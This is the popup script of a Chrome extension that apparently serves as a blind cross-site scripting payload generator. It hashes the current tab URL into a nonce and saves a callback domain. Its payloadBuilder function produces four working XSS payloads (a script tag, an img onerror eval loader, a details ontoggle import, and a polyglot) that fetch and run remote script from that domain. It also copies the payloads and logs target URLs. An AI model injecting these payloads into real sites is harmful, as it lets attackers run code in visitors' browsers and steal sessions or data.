// MD5 function (minified)
var md5 = function(d){var r = M(V(Y(X(d),8*d.length)));return r.toLowerCase()};function M(d){for(var _,m="0123456789ABCDEF",f="",r=0;r<d.length;r++)_=d.charCodeAt(r),f+=m.charAt(_>>>4&15)+m.charAt(15&_);return f}function X(d){for(var _=Array(d.length>>2),m=0;m<_.length;m++)_[m]=0;for(m=0;m<8*d.length;m+=8)_[m>>5]|=(255&d.charCodeAt(m/8))<<m%32;return _}function V(d){for(var _="",m=0;m<32*d.length;m+=8)_+=String.fromCharCode(d[m>>5]>>>m%32&255);return _}function Y(d,_){d[_>>5]|=128<<_%32,d[14+(_+64>>>9<<4)]=_;for(var m=1732584193,f=-271733879,r=-1732584194,i=271733878,n=0;n<d.length;n+=16){var h=m,t=f,g=r,e=i;f=md5_ii(f=md5_ii(f=md5_ii(f=md5_ii(f=md5_hh(f=md5_hh(f=md5_hh(f=md5_hh(f=md5_gg(f=md5_gg(f=md5_gg(f=md5_gg(f=md5_ff(f=md5_ff(f=md5_ff(f=md5_ff(f,r=md5_ff(r,i=md5_ff(i,m=md5_ff(m,f,r,i,d[n+0],7,-680876936),f,r,d[n+1],12,-389564586),m,f,d[n+2],17,606105819),i,m,d[n+3],22,-1044525330),r=md5_ff(r,i=md5_ff(i,m=md5_ff(m,f,r,i,d[n+4],7,-176418897),f,r,d[n+5],12,1200080426),m,f,d[n+6],17,-1473231341),i,m,d[n+7],22,-45705983),r=md5_ff(r,i=md5_ff(i,m=md5_ff(m,f,r,i,d[n+8],7,1770035416),f,r,d[n+9],12,-1958414417),m,f,d[n+10],17,-42063),i,m,d[n+11],22,-1990404162),r=md5_ff(r,i=md5_ff(i,m=md5_ff(m,f,r,i,d[n+12],7,1804603682),f,r,d[n+13],12,-40341101),m,f,d[n+14],17,-1502002290),i,m,d[n+15],22,1236535329),r=md5_gg(r,i=md5_gg(i,m=md5_gg(m,f,r,i,d[n+1],5,-165796510),f,r,d[n+6],9,-1069501632),m,f,d[n+11],14,643717713),i,m,d[n+0],20,-373897302),r=md5_gg(r,i=md5_gg(i,m=md5_gg(m,f,r,i,d[n+5],5,-701558691),f,r,d[n+10],9,38016083),m,f,d[n+15],14,-660478335),i,m,d[n+4],20,-405537848),r=md5_gg(r,i=md5_gg(i,m=md5_gg(m,f,r,i,d[n+9],5,568446438),f,r,d[n+14],9,-1019803690),m,f,d[n+3],14,-187363961),i,m,d[n+8],20,1163531501),r=md5_gg(r,i=md5_gg(i,m=md5_gg(m,f,r,i,d[n+13],5,-1444681467),f,r,d[n+2],9,-51403784),m,f,d[n+7],14,1735328473),i,m,d[n+12],20,-1926607734),r=md5_hh(r,i=md5_hh(i,m=md5_hh(m,f,r,i,d[n+5],4,-378558),f,r,d[n+8],11,-2022574463),m,f,d[n+11],16,1839030562),i,m,d[n+14],23,-35309556),r=md5_hh(r,i=md5_hh(i,m=md5_hh(m,f,r,i,d[n+1],4,-1530992060),f,r,d[n+4],11,1272893353),m,f,d[n+7],16,-155497632),i,m,d[n+10],23,-1094730640),r=md5_hh(r,i=md5_hh(i,m=md5_hh(m,f,r,i,d[n+13],4,681279174),f,r,d[n+0],11,-358537222),m,f,d[n+3],16,-722521979),i,m,d[n+6],23,76029189),r=md5_hh(r,i=md5_hh(i,m=md5_hh(m,f,r,i,d[n+9],4,-640364487),f,r,d[n+12],11,-421815835),m,f,d[n+15],16,530742520),i,m,d[n+2],23,-995338651),r=md5_ii(r,i=md5_ii(i,m=md5_ii(m,f,r,i,d[n+0],6,-198630844),f,r,d[n+7],10,1126891415),m,f,d[n+14],15,-1416354905),i,m,d[n+5],21,-57434055),r=md5_ii(r,i=md5_ii(i,m=md5_ii(m,f,r,i,d[n+12],6,1700485571),f,r,d[n+3],10,-1894986606),m,f,d[n+10],15,-1051523),i,m,d[n+1],21,-2054922799),r=md5_ii(r,i=md5_ii(i,m=md5_ii(m,f,r,i,d[n+8],6,1873313359),f,r,d[n+15],10,-30611744),m,f,d[n+6],15,-1560198380),i,m,d[n+13],21,1309151649),r=md5_ii(r,i=md5_ii(i,m=md5_ii(m,f,r,i,d[n+4],6,-145523070),f,r,d[n+11],10,-1120210379),m,f,d[n+2],15,718787259),i,m,d[n+9],21,-343485551),m=safe_add(m,h),f=safe_add(f,t),r=safe_add(r,g),i=safe_add(i,e)}return Array(m,f,r,i)}function md5_cmn(d,_,m,f,r,i){return safe_add(bit_rol(safe_add(safe_add(_,d),safe_add(f,i)),r),m)}function md5_ff(d,_,m,f,r,i,n){return md5_cmn(_&m|~_&f,d,_,r,i,n)}function md5_gg(d,_,m,f,r,i,n){return md5_cmn(_&f|m&~f,d,_,r,i,n)}function md5_hh(d,_,m,f,r,i,n){return md5_cmn(_^m^f,d,_,r,i,n)}function md5_ii(d,_,m,f,r,i,n){return md5_cmn(m^(_|~f),d,_,r,i,n)}function safe_add(d,_){var m=(65535&d)+(65535&_);return(d>>16)+(_>>16)+(m>>16)<<16|65535&m}function bit_rol(d,_){return d<<_|d>>>32-_}

// Functions moved from background.js to popup.js for Manifest V3 compatibility
function generateUrlHash() {
  // Get the current URL
  chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
    const currentUrl = tabs[0].url;

    // Generate a 6-character unique hash for the current URL using the md5 function
    const hash = md5(currentUrl).substring(0, 6);

    // Insert the hash into the nonce input
    document.getElementById("nonce").value = hash;
  });
}

function captureCurrentUrl() {
  // Get the current URL
  chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
    const currentUrl = tabs[0].url;

    // Insert the current URL into the current URL input
    document.getElementById("current-url").value = currentUrl;
  });
}

function toload(){
	captureCurrentUrl();
	generateUrlHash();
	getDomain(function(domain){
		document.getElementById("domain").value=domain; 
		// Initialize payload container first, then populate payloads
		initializePayloadContainer();
		setTimeout(() => {
			payloadBuilder();
			// Setup copy functionality after payloads are populated
			copyBuild();
		}, 50);
	});
	var btn = document.getElementById('saveDomainButton');
	btn.onclick = function(){saveDomain(document.getElementById("domain").value); location.reload();};
	
	// Setup View History button
	var historyBtn = document.getElementById('viewHistoryButton');
	historyBtn.onclick = function(){
		chrome.tabs.create({url: chrome.runtime.getURL('history.html')});
	};
	
	// Setup Copy All Payloads button
	var copyAllBtn = document.getElementById('copyAllPayloadsButton');
	copyAllBtn.onclick = function(){
		copyAllPayloads();
	};
	
	// Update stats
	updatePopupStats();
}

// Storage functions
function saveUrlHash() {
  // Save the URL and hash in the chrome.storage.sync storage with timestamp
  const url = document.getElementById("current-url").value;
  const hash = document.getElementById("nonce").value;
  
  // Create a unique key for this entry
  const timestamp = Date.now();
  const entryKey = `history_${timestamp}`;
  
  // Save the entry with full data structure
  const entry = {
    url: url,
    hash: hash,
    timestamp: timestamp,
    date: new Date(timestamp).toLocaleString()
  };
  
  chrome.storage.sync.set({ [entryKey]: entry }, function() {
    console.log(`Saved history entry:`, entry);
    // Update stats after saving
    updatePopupStats();
  });
}



function saveDomain(domain) {
  // Save the domain in the chrome.storage.sync storage
  chrome.storage.sync.set({ 'domain': domain }, function() {
  console.log(`Saved domain: ${domain}`);
});
}

function getDomain(callback) {
  // Get the domain from the chrome.storage.sync storage
  chrome.storage.sync.get("domain", function(items) {
    // Check if the domain exists in the storage
    if (items.domain) {
      // Call the callback function with the domain as an argument
      callback(items.domain);
    } else {
      console.log("Domain does not exist in the storage");
    }
  });
}



function copyInputValue(inputId, buttonId) {
    console.log(`Setting up copy for ${inputId} with button ${buttonId}`);
    const copyButton = document.getElementById(buttonId);
    const inputField = document.getElementById(inputId);

    if (!copyButton) {
        console.log(`Copy button ${buttonId} not found`);
        return;
    }
    if (!inputField) {
        console.log(`Input field ${inputId} not found`);
        return;
    }

    copyButton.onclick = function(){
        console.log(`Copy button clicked for ${inputId}`);
        // Select the input field's text
        inputField.select();

        // Copy the input field's text to the clipboard using modern API
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(inputField.value).then(() => {
                console.log(`Copied: ${inputField.value}`);
                saveUrlHash(); 
                showMessage(2000);
            }).catch(err => {
                console.error('Clipboard write failed:', err);
                // Fallback
                document.execCommand("copy"); 
                saveUrlHash(); 
                showMessage(2000);
            });
        } else {
            // Fallback for older browsers
            document.execCommand("copy"); 
            saveUrlHash(); 
            showMessage(2000);
        }
    };
    console.log(`Copy functionality set up for ${inputId}`);
}

function showMessage(duration) {
    // Show the message
    const messageElement = document.getElementById("message");
    if (messageElement) {
        messageElement.style.display = "block";
        
        // Hide the message after the specified duration
        setTimeout(() => {
            messageElement.style.display = "none";
        }, duration);
    }
}

// Simplified payload generation with only requested payloads
function payloadBuilder(){
	console.log('payloadBuilder called');
	
	const xdomain = document.getElementById("domain").value;
	const xnonce = document.getElementById("nonce").value;
	
	console.log('Domain:', xdomain, 'Nonce:', xnonce);
	
	// Base64 encoded script
	const b64 = `var a=document.createElement("script");a.src="https://${xdomain}?n=${xnonce}";document.body.appendChild(a);`;
	const b64Encoded = btoa(b64);
	
	// Requested payloads only
	const p1 = `"><script src=https://${xdomain}?n=${xnonce}></script>`;
	const p2 = `"><img src=x id=${b64Encoded} onerror=eval(atob(this.id))>`;
	const p3 = `-->"//'//></script><details/open/ontoggle="import('https://${xdomain}?n=${xnonce}')">`;
	
	// Custom polyglot payload with domain and nonce
	const p4 = `'"*/onmouseover=(print)?.()><sVg/oNload='1>(_=prompt,_\`{{7*7}}\`)'></sTyle/</scRIpt/</textArea/</noScript/</tiTle/-->＜h1/<h1><image/onerror='alert\`1\`%27'src=https://${xdomain}?n=${xnonce}>Ynoof%22%3E%3CSvg/onload="import('https://${xdomain}?n=${xnonce}')"u0022\\u003e\\u003csVg/\\x22\\x3e\\x3csVg/&quot;&gt;&lt;svG/onload=import('https://${xdomain}?n=${xnonce}')//`;
	
	// Set payload values in input fields
	const payloads = [p1, p2, p3, p4];
	
	console.log('Generated payloads:', payloads);
	
	for(let i = 0; i < payloads.length; i++) {
		const element = document.getElementById(`payload${i+1}`);
		if(element) {
			element.value = payloads[i];
			console.log(`Set payload${i+1}:`, payloads[i]);
		} else {
			console.log(`Element payload${i+1} not found`);
		}
	}
}

function copyBuild(){
	console.log('copyBuild called');
	// Copy functions for the 4 payloads only
	for(let i = 1; i <= 4; i++) {
		const copyButton = document.getElementById(`copy${i}`);
		if(copyButton) {
			console.log(`Found copy button ${i}, setting up copy functionality`);
			copyInputValue(`payload${i}`, `copy${i}`);
		} else {
			console.log(`Copy button ${i} not found`);
		}
	}
}

function copyAllPayloads() {
	console.log('copyAllPayloads called');
	
	// Collect all payload values
	const payloads = [];
	for(let i = 1; i <= 4; i++) {
		const element = document.getElementById(`payload${i}`);
		if(element && element.value) {
			payloads.push(element.value);
		}
	}
	
	if(payloads.length === 0) {
		console.log('No payloads found to copy');
		showMessage(2000);
		return;
	}
	
	// Join all payloads with newlines
	const allPayloadsText = payloads.join('\n\n');
	console.log('Copying all payloads:', allPayloadsText);
	
	// Copy to clipboard using modern API
	if (navigator.clipboard && window.isSecureContext) {
		navigator.clipboard.writeText(allPayloadsText).then(() => {
			console.log('Successfully copied all payloads');
			saveUrlHash();
			showMessage(2000);
		}).catch(err => {
			console.error('Clipboard write failed:', err);
			// Fallback
			const textArea = document.createElement('textarea');
			textArea.value = allPayloadsText;
			document.body.appendChild(textArea);
			textArea.select();
			document.execCommand('copy');
			document.body.removeChild(textArea);
			saveUrlHash();
			showMessage(2000);
		});
	} else {
		// Fallback for older browsers
		const textArea = document.createElement('textarea');
		textArea.value = allPayloadsText;
		document.body.appendChild(textArea);
		textArea.select();
		document.execCommand('copy');
		document.body.removeChild(textArea);
		saveUrlHash();
		showMessage(2000);
	}
}

// Update popup statistics
function updatePopupStats() {
	// Get all history entries to calculate stats
	chrome.storage.sync.get(null, (items) => {
		let savedUrlsCount = 0;
		
		// Count history entries
		for (const key in items) {
			if (key.startsWith('history_')) {
				savedUrlsCount++;
			}
		}
		
		// Update saved URLs count
		const savedUrlsElement = document.getElementById('savedUrls');
		if (savedUrlsElement) {
			savedUrlsElement.textContent = savedUrlsCount;
		}
		
		console.log('Updated stats - Saved URLs:', savedUrlsCount);
	});
}



// Initialize when popup loads
window.onload = function() {
    toload();
}

// Initialize payload container
function initializePayloadContainer() {
    const container = document.getElementById('payloadContainer');
    if (!container) {
        console.log('Payload container not found');
        return;
    }
    
    // Clear existing content
    container.innerHTML = '';
    
    const payloadLabels = ['Script Tag', 'Image Tag', 'Details Tag', 'Polyglot Payload'];
    
    payloadLabels.forEach((label, index) => {
        const row = document.createElement('div');
        row.className = 'payload-row';
        
        row.innerHTML = `
            <div class="payload-label">${label}:</div>
            <input type="text" class="payload-input" id="payload${index + 1}" readonly />
            <button class="payload-copy" id="copy${index + 1}">Copy</button>
        `;
        
        container.appendChild(row);
    });
    
    console.log('Payload container initialized with', payloadLabels.length, 'payloads');
}